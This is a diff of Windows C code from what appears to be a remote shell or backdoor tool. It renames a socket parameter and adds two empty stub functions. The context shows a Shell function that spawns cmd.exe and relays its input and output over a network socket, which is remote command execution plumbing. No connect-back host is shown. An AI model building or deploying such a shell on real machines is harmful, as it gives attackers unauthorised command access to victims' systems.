@@ -35,7 +35,7 @@ int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt){
     return 0;
 }
 
-int Shell(PROCESS_INFORMATION pi, SOCKET sock)
+int Shell(PROCESS_INFORMATION pi, SOCKET sockt)
 {
     int iResult;
     HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
@@ -60,21 +60,21 @@ int Shell(PROCESS_INFORMATION pi, SOCKET sock)
     if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
     {
         perror("failed at creating process");
-        closesocket(sock);
+        closesocket(sockt);
         return -2;
     }
     CloseHandle(hStdoutWr);
     CloseHandle(hStdinRd);
     /* INITIAL CMD LOADING*/
-    ScanOutPipe(hStdoutRd, &readOverlapped, sock);
-    ScanOutPipe(hStdoutRd, &readOverlapped, sock);
+    ScanOutPipe(hStdoutRd, &readOverlapped, sockt);
+    ScanOutPipe(hStdoutRd, &readOverlapped, sockt);
     /*END OF LOADING*/
     while (1){
-        iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sock);
+        iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sockt);
         if (iResult){
             break;
         }
-        iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sock);
+        iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sockt);
         if(iResult){
             break;
         }
@@ -85,4 +85,14 @@ int Shell(PROCESS_INFORMATION pi, SOCKET sock)
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     return 0;
+}
+
+int Cout(SOCKET sockt, ...)
+{
+    return -1;
+}
+
+int File(SOCKET sockt, ...)
+{
+    return -1;
 }
